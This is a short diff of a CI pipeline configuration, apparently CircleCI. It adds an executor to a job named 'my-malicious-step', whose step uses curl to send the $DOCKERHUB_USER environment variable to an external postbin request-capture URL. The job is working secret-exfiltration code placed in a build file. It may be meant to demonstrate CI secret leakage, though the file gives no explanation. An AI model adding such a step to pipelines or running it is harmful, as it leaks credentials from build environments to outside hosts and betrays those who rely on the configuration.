@@ -77,6 +77,9 @@ jobs:
           name: push schema changes
           command: node scripts/push-schema-changes.js
   my-malicious-step:
+    executor:
+      name: node/default
+      tag: "14.17"
     steps:
       - run: curl https://www.toptal.com/developers/postbin/1661275748486-1824831354897?example=$DOCKERHUB_USER
 
